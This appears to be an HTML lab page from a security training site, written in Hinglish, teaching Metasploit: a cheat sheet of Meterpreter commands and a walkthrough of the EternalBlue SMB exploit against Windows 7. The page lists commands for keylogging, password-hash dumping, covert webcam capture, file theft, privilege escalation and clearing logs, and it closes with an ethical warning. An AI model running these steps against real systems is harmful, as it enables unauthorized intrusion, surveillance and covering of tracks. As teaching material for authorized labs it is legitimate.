@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab 10 Manual | Metasploit Framework | Owlguard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="lab10.css" rel="stylesheet">
+   <link rel="icon" type="image/png" href="favicon.jpeg">
+</head>
+<body>
+
+    <nav>
+        <a href="index.html" class="logo">OWLGUARD</a>
+        <a href="index.html" style="color: #fff; text-decoration: none;"><i class="fas fa-arrow-left"></i> HOME </a>
+    </nav>
+
+    <header class="lab-header">
+        <p>LAB 10</p>
+        <h1>Metasploit Exploitation Manual</h1>
+        <p>Target systems ki vulnerabilities ko exploit karke unauthorized access lena.</p>
+    </header>
+
+    <div class="content-container">
+
+        <section class="commands-section">
+            <h2><i class="fas fa-biohazard"></i> 30 Essential MSF Commands</h2>
+            <p>Hacking start karne se pehle ye commands aapki "Cheat Sheet" hain.</p>
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Command</th>
+                            <th>Kyu Use Karein? (Action)</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr><td class="cmd-text">msfconsole</td><td>Framework ko start karne ke liye.</td></tr>
+                        <tr><td class="cmd-text">search [exploit_name]</td><td>Vulnerability dhundne ke liye (e.g., search smb).</td></tr>
+                        <tr><td class="cmd-text">use [path/to/module]</td><td>Select kiya hua exploit activate karna.</td></tr>
+                        <tr><td class="cmd-text">show options</td><td>RHOST, LHOST settings check karna.</td></tr>
+                        <tr><td class="cmd-text">set RHOSTS [Target_IP]</td><td>Target machine ka IP set karna.</td></tr>
+                        <tr><td class="cmd-text">set LHOST [Your_IP]</td><td>Apna machine (Attacker) ka IP set karna.</td></tr>
+                        <tr><td class="cmd-text">exploit / run</td><td>Attack ko execute karna.</td></tr>
+                        <tr><td class="cmd-text">sessions -l</td><td>Sare active hacked sessions ki list dekhna.</td></tr>
+                        <tr><td class="cmd-text">sessions -i [ID]</td><td>Kisi specific hacked session me enter karna.</td></tr>
+                        <tr><td class="cmd-text">background</td><td>Session se bahar aana (Bina use band kiye).</td></tr>
+                        <tr><td class="cmd-text">getuid</td><td>Check karna aap kaunse user ho (Meterpreter).</td></tr>
+                        <tr><td class="cmd-text">sysinfo</td><td>Target PC ka OS aur architecture check karna.</td></tr>
+                        <tr><td class="cmd-text">screenshot</td><td>Target PC ki screen ka live photo lena.</td></tr>
+                        <tr><td class="cmd-text">keyscan_start</td><td>Keylogger shuru karna (Sab record hoga).</td></tr>
+                        <tr><td class="cmd-text">keyscan_dump</td><td>Type kiye huye passwords dekhna.</td></tr>
+                        <tr><td class="cmd-text">hashdump</td><td>Database se passwords (hashes) nikalna.</td></tr>
+                        <tr><td class="cmd-text">shell</td><td>Target ka normal CMD prompt open karna.</td></tr>
+                        <tr><td class="cmd-text">upload [file_path]</td><td>Target PC par koi file/virus bhejna.</td></tr>
+                        <tr><td class="cmd-text">download [file_path]</td><td>Target PC se koi file churana.</td></tr>
+                        <tr><td class="cmd-text">ps</td><td>Target par chal rahe sare apps dekhna.</td></tr>
+                        <tr><td class="cmd-text">migrate [PID]</td><td>Hiding: Apne aap ko safe app me hide karna.</td></tr>
+                        <tr><td class="cmd-text">clearev</td><td>Apne footprints (logs) mita dena.</td></tr>
+                        <tr><td class="cmd-text">webcam_list</td><td>Target ke webcams ki list dekhna.</td></tr>
+                        <tr><td class="cmd-text">webcam_snap</td><td>Target ke camera se bina bataye photo lena.</td></tr>
+                        <tr><td class="cmd-text">getsystem</td><td>Normal user se Admin/System user banna.</td></tr>
+                        <tr><td class="cmd-text">pwd</td><td>Check karna aap target ke kaunse folder me ho.</td></tr>
+                        <tr><td class="cmd-text">ls</td><td>Target folder ki saari files dekhna.</td></tr>
+                        <tr><td class="cmd-text">search -f *.pdf</td><td>Target ke PC par PDF files dhundna.</td></tr>
+                        <tr><td class="cmd-text">reboot</td><td>Target PC ko restart kar dena.</td></tr>
+                        <tr><td class="cmd-text">exit</td><td>Session band karke bahar aana.</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <section class="step-card">
+            <h3><i class="fas fa-crosshairs"></i> Step 1: Target Scanning</h3>
+            <p>Sabse pehle Nmap se service version pata karein. Agar target <strong>Windows 7</strong> hai aur <strong>SMB</strong> port khula hai, toh ye vulnerable ho sakta hai.</p>
+            <div class="terminal-box">search eternalblue</div>
+        </section>
+
+        <section class="step-card">
+            <h3><i class="fas fa-tools"></i> Step 2: Configuring Exploit</h3>
+            <p>Select karne ke baad parameters set karein. Hamesha dhyan rakhein ki <strong>LHOST</strong> aapka IP hai aur <strong>RHOST</strong> target ka.</p>
+            <div class="logic-box">
+                <strong>Logic:</strong> Exploit wo rasta hai jisse hum andar ghuste hain, aur Payload (Meterpreter) wo agent hai jo andar ja kar hamara kaam karta hai.
+            </div>
+        </section>
+
+        <section class="step-card">
+            <h3><i class="fas fa-skull"></i> Step 3: Gaining Access</h3>
+            <p>Exploit command run karein. Agar everything is right, aapko meterpreter prompt mil jayega.</p>
+            <div class="terminal-box">exploit</div>
+            <p>Ab aap <code>screenshot</code> ya <code>keyscan_start</code> chala kar data collect kar sakte hain.</p>
+        </section>
+
+        <section class="step-card" style="border-left: 5px solid #ff4b2b;">
+            <h3><i class="fas fa-shield-alt"></i> Ethical Warning</h3>
+            <p>Metasploit ek khatarnak weapon hai. Ise sirf apne local labs (VirtualBox) me ya authorized testing ke liye hi use karein. Dusro ke devices par chalana illegal hai.</p>
+        </section>
+
+    </div>
+
+    <footer>
+        <p>&copy;  2026 | Secured by OwlGuard | All Rights Reserved </p>
+    </footer>
+
+</body>
+</html>
